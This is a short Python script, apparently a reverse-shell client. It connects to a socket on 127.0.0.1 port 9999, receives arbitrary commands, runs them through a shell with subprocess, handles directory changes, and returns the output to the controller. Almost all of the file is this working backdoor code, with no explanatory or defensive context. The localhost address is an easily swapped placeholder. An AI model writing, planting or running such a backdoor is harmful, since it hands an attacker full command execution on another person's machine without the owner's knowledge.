import socket
import os
import subprocess


def foo():
    print("baz")

run = True

if not run:
    exit()

s = socket.socket()
host = "127.0.0.1"
port = 9999

s.connect((host, port))


while run:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        # Changing Directory
        os.chdir(data[3:].decode("utf-8"))

    # If There is a Command
    if len(data) > 0:
        # Popen - Opens a Process
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        outputByte = cmd.stdout.read() + cmd.stderr.read()
        outputString = str(outputByte, 'utf-8')

        currWorkingDir = os.getcwd() + "> "
        s.send(str.encode(outputString + currWorkingDir))

        print(outputString)

